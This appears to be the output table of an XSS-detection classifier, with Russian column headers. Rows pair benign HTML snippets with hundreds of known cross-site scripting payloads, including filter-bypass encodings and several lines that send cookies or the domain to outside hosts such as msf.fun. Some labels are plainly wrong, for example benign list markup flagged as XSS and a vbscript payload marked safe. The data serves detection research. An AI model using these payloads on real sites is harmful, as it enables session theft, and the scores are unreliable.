Входная строка;XSS;Вероятность;Риск
""">%0D%0A%0D%0A<x '=""foo""><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>";True;99.02%;CRITICAL
<p>About</p>;False;34.33%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<p>About</p>;False;34.33%;LOW
<input type='text' name='field'>;False;29.42%;LOW
//j\\javascript:alert(document.domain);True;96.86%;CRITICAL
<svg/onload=location/**/='https://your.server/'+document.domain>;True;98.25%;CRITICAL
<span class='class-1254'>Services</span>;False;1.13%;SAFE
"javascript:alert(1);/////";True;96.03%;CRITICAL
<img/src=x alt=confirm(1) onmouseover=eval(alt)>;True;99.32%;CRITICAL
"%27%3E'><script>alert(2);</script>";True;88.73%;CRITICAL
<span class='class-1434'>Services</span>;False;1.13%;SAFE
%3F%20<img/src/onerror=alert(test`)>;True;99.33%;CRITICAL
<p>About</p>;False;34.33%;LOW
"<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>";True;96.97%;CRITICAL
"<body onload=""eval(atob('YWxlcnQoJ1N1Y2Nlc3NmdWwgWFNTJyk='))"">";True;91.72%;CRITICAL
<span class='class-1084'>Services</span>;False;1.13%;SAFE
<p>About</p>;False;34.33%;LOW
"""><svg+onload=alert&amp;#x8F""1";True;99.49%;CRITICAL
<span class='class-184'>Services</span>;False;1.13%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"%0d%0a%20""><img src=q onerror=alert(1)>";True;99.66%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"'><script>alert(123);</script x='";True;92.19%;CRITICAL
alert?.(1);True;81.96%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"';alert(document.cookie)//";True;90.66%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"""><svg+onload=alert&amp;#x22""1";True;99.49%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
""">&lt;img src=x onerror=prompt(document.domain);&gt;";True;84.31%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"""+onError=prompt(123)""+";True;74.32%;HIGH
<button>Read more</button>;False;28.28%;LOW
<p>About</p>;False;34.33%;LOW
"<IMG DYNSRC=""javascript:alert('XSS')"">";True;98.63%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<div>Home</div>;False;25.75%;LOW
"""><img/src/onerror=alert(`test`)>";True;99.42%;CRITICAL
"<a href=""\x1Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>";False;3.46%;SAFE
"""><svg+onload=alert&amp;#x88""1";True;99.49%;CRITICAL
"<audio autoplay onloadstart=this.src='hxxps://msf.fun/?c='+document[""cook""+""ie""]' src=x>";True;90.81%;CRITICAL
"""><script>alert(1)</script><""";True;94.52%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
<button>Read more</button>;False;28.28%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<svg id=1 onload=confirm(1)>;True;84.45%;CRITICAL
<h4>Login</h4>;False;27.98%;LOW
"<IMG SRC="" &#14;  javascript:alert('XSS');"">";True;98.67%;CRITICAL
a=alert,a(1);True;88.74%;CRITICAL
"eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0:2(1)',3,3,'javascript||alert'.split('|'),0,{}))";True;39.26%;LOW
<s%00c%00r%00i%00p%00t>alert(1)</script>;True;77.35%;HIGH
<div>Home</div>;False;25.75%;LOW
"<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>";True;81.05%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<p>About</p>;False;34.33%;LOW
<h2>Login</h2>;False;27.98%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"x\""><svg%0Donload=\""window[\'alert\']((document)[\'cookie\'])\"">";True;93.13%;CRITICAL
"""><svg+onload=alert&amp;#x36""1";True;99.49%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
>><marquee loop=1 width=0 onfinish=alert(1)> -@manjith27945363;True;98.97%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<h6>Login</h6>;False;27.98%;LOW
"""><svg+onload=alert&amp;#x6B""1";True;99.49%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
'></script><svg/onload=alert(document.cookie)>;True;98.95%;CRITICAL
<p>About</p>;False;34.33%;LOW
"""'><img src=q onerror=alert(1)>";True;99.78%;CRITICAL
<svg/onload=parent[/al/.source+/ert/.source] (1)>;True;99.12%;CRITICAL
<p>About</p>;False;34.33%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<h4>Login</h4>;False;27.98%;LOW
<button>Read more</button>;False;28.28%;LOW
"%3F%20""><img src=x onerror=prompt(document.domain);>";True;83.59%;CRITICAL
%2527%2520onfocus%253D%2527alert%25281%2529%2527%2520autofocus%253D%2527;True;75.94%;HIGH
<h2>Login</h2>;False;27.98%;LOW
"<INPUT+TYPE=""IMAGE""+SRC=""javascript:alert(1);"">";True;87.78%;CRITICAL
<svg/onload=location/**/='http://GH0ST.xss.ht/'+document.dom;True;82.54%;CRITICAL
<span class='class-364'>Services</span>;False;1.13%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
<h4>Login</h4>;False;27.98%;LOW
{{_toDisplayString.constructor('alert(1)')()}};True;82.31%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<svg/onloadâ€‹=prompt()>;False;15.08%;SAFE
<p>About</p>;False;34.33%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"'"">><div><meter onmouseover=""alert(1)""</div>"" -@manjith27945363";True;99.73%;CRITICAL
<p>About</p>;False;34.33%;LOW
"<body onresize=""print()"">";True;73.57%;HIGH
<a href='/page'>Contact</a>;False;1.05%;SAFE
<a href='/page'>Contact</a>;False;1.05%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>;True;93.23%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<div>Home</div>;False;25.75%;LOW
<svg/&parameter=onload=alert()>;True;99.26%;CRITICAL
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>";True;71.39%;HIGH
<a href='/page'>Contact</a>;False;1.05%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<h6>Login</h6>;False;27.98%;LOW
"""&amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;gt;";True;99.67%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""><img src=x onerror=prompt('document.domain');>.html";True;80.54%;CRITICAL
<p onfocus=alert(1) autofocus tabindex=1>;True;99.70%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"&#60;body onload=alert('XSS')&#62;&#34;&#34;";True;99.23%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"<body onhashchange=""print()"">";True;69.08%;HIGH
"""><img src=x onerror=confirm('x') />]";True;73.64%;HIGH
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<img src=1 onerror=print()>;True;84.02%;CRITICAL
3Cscript%3Ealert(1)%3C%2Fscript%3E;True;92.60%;CRITICAL
<iMg onerror=alert(1) src=a>;True;99.73%;CRITICAL
'>alert(1)</script><script/1=';True;91.84%;CRITICAL
"<input type=""hidden"" value=""mypayload"" /> %22%20autofocus%20onfocus%3d(confirm)(1)%2f%2f";False;0.82%;SAFE
<button>Read more</button>;False;28.28%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<xml onreadystatechange=alert(1)>;True;99.07%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"<xss onkeypress=""alert(1)"" contenteditable style=display:block>test</xss>";True;99.79%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<object data=javascript:alert(1)>;True;93.71%;CRITICAL
"<a href='vbscript:MsgBox(""Successful XSS"")'>Click here</a>";False;2.24%;SAFE
"x""><svg%0Donload=""window['alert']((document)['cookie'])"">";True;93.40%;CRITICAL
"""><script>alert(123);</script x=""";True;92.19%;CRITICAL
<span class='class-534'>Services</span>;False;1.13%;SAFE
<a href='/page'>Contact</a>;False;1.05%;SAFE
%3Cscript%3Ealert('XSS')%3C/script%3E;True;93.11%;CRITICAL
"""><img src=x onerror='alert(document.domain)'>";True;98.39%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"$(""script(2)"")";True;83.63%;CRITICAL
%2522%3E%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%70%72%6F%6D%70%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3B%3E;True;70.29%;HIGH
<button>Read more</button>;False;28.28%;LOW
"<iframe><img title=""</iframe><img src onerror=alert(1)>""></iframe>";True;99.72%;CRITICAL
///%01javascript:alert(document.cookie)/;True;95.63%;CRITICAL
"""><svg+onload=alert&amp;#x69""1";True;99.49%;CRITICAL
redirect.aspx?url=javascript://%250Aalert(document.domain);True;93.05%;CRITICAL
"'});alert(document.cookie);//'";True;89.42%;CRITICAL
"/><script>window.alert('XSS Vulnerable');</script>";True;88.37%;CRITICAL
"""&amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;lt;img src=x onerror=prompt(document.domain);&amp;amp;amp;amp;amp;gt;";True;98.27%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"""><svg+onload=alert&amp;#x0D""1";True;99.49%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<div>Home</div>;False;25.75%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<button>Read more</button>;False;28.28%;LOW
<span class='class-274'>Services</span>;False;1.13%;SAFE
<svg onload=confirm(1);True;84.57%;CRITICAL
<span class='class-54'>Services</span>;False;1.21%;SAFE
"""><img src=x\%28\%29\ onerror=prompt(document.domain);>";True;86.55%;CRITICAL
<span class='class-804'>Services</span>;False;1.13%;SAFE
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
%3Cscript%0Baaa%3Ealert%281%29%3C/script%3E;True;92.39%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
"""><svg+onload=alert&amp;#x15""1";True;99.49%;CRITICAL
<div>Home</div>;False;25.75%;LOW
alert##<script>prompt(1234)</script>;True;83.41%;CRITICAL
"%22%3E%3Cobject%20data=data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E%3C/object%3E";True;85.14%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<h4>Login</h4>;False;27.98%;LOW
"<img onerror=eval(â€˜al&#x5c;u0065rt(1)â€™)src=a>";True;92.94%;CRITICAL
"""%3E<img src=x onerror=prompt(document.domain);%3E""";True;82.93%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"""><svg+onload=alert&amp;#x71""1";True;99.49%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<p>About</p>;False;34.33%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<button>Read more</button>;False;28.28%;LOW
"<iframe src=""javascript:alert(1)""></iframe>";True;94.69%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<h2>Login</h2>;False;27.98%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<input type='text' name='field'>;False;29.42%;LOW
redirect.asp?url=javascript://%250Aalert(document.domain);True;93.05%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<*script>prompt(123)<*/script>;True;77.17%;HIGH
</script><script>alert(123)</script>;True;84.83%;CRITICAL
"""onmouseover=""alert(document.cookie)""><!--";True;98.99%;CRITICAL
"<Svg On Only=1 Onload=alert(""hex"")>";True;95.34%;CRITICAL
<span class='class-1204'>Services</span>;False;1.13%;SAFE
<details ontoggle=alert(1) open>test</details>;True;99.85%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=;True;98.83%;CRITICAL
"<iframe src=""data:text/html,<script>alert(1)</script>""></iframe>";True;92.43%;CRITICAL
<img o[%00]nerror=alert(1) src=a>;True;99.78%;CRITICAL
"<input type=""image"" src=""javascript:alert('Successful XSS')"">";True;82.29%;CRITICAL
%22%2525%2F%28%29%2C%20alert%281%29%3B%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3B%3E%3Cscript%3E;True;81.13%;CRITICAL
"<img/src=x onError=""`${x}`;alert(`Ex.Mi`);""> -@ex_mi";True;99.12%;CRITICAL
ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6 -@naglinagli;True;80.73%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"""><svg+onload=alert&amp;#x87""1";True;99.49%;CRITICAL
<span class='class-1124'>Services</span>;False;1.13%;SAFE
"""><img src=x&#9;onerror=prompt(document.domain);>";True;82.49%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
"""><svg+onload=alert&amp;#x8B""1";True;99.49%;CRITICAL
"/\<script((\\s+\\w+(\\s\*=\\s\*(?:""(.)\*?""|'(.)\*?'|\[^'""\>\\s\]+))?)+\\s\*|\\s\*)src/i";False;30.84%;LOW
</br style=a:expression(alert(1))>;True;67.39%;HIGH
%20<img/src/onerror=alert(test`)>;True;99.37%;CRITICAL
"""/>%3ciframe%20src%3djavascript%3aalert%283%29%3e";True;94.74%;CRITICAL
<scr<script>ipt>prompt(document.cookie)</scr</script>ipt>;True;74.98%;HIGH
<!--><svg onload=alert(1)-->.php;True;99.63%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>";True;86.32%;CRITICAL
<p>About</p>;False;34.33%;LOW
"IMG+LOWSRC=""javascript:alert(1);"">";True;97.66%;CRITICAL
"&#x60;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;&#x97;&#x108;&#x101;&#x114;&#x116;&#x40;&#x39;&#x120;&#x115;&#x115;&#x39;&#x41;&#x60;&#x47;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;";True;73.61%;HIGH
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"<img/src/onerror=""(function(x){this[x+`ert`](1)})`al`"">";True;85.67%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<a href='/page'>Contact</a>;False;1.05%;SAFE
"%22%3E%3Cimg%09src%3Dx%09onerror%3Dprompt(document.domain);%3E";True;73.37%;HIGH
<button>Read more</button>;False;28.28%;LOW
"""><img src=x onerror=""prompt(document.domain);"">";True;74.94%;HIGH
"'%27%3E%27%22%3E%3Cscript%3Ealert(2);%3C/script%3E'";True;91.48%;CRITICAL
"""><img src:x onerror=prompt(document.domain);>";True;82.49%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"<applet code=""javascript:confirm(document.cookie);"">";True;87.91%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
"data:text/html;base64,Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KGRvY3VtZW50LmNvb2tpZSk7PjEy";True;63.28%;HIGH
</plaintext\></|\><plaintext/onmouseover=prompt(1);True;99.64%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
javascript:(alert('XSS Success!'))();True;97.35%;CRITICAL
<p>About</p>;False;34.33%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"1'""();<test><ScRiPt>alert(""XSS_WAF_BYPASS"")</ScRiPt>";True;92.50%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"');alert(1)//";True;93.43%;CRITICAL
"<x title""=""&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;"">";True;51.26%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
%22%3E%3Csvg%20onload%3Dalert%26amp%3B%26amp%3B%23x00000040%221%22%29%3E;True;75.95%;HIGH
<button>Read more</button>;False;28.28%;LOW
<div>Home</div>;False;25.75%;LOW
<span class='class-744'>Services</span>;False;1.13%;SAFE
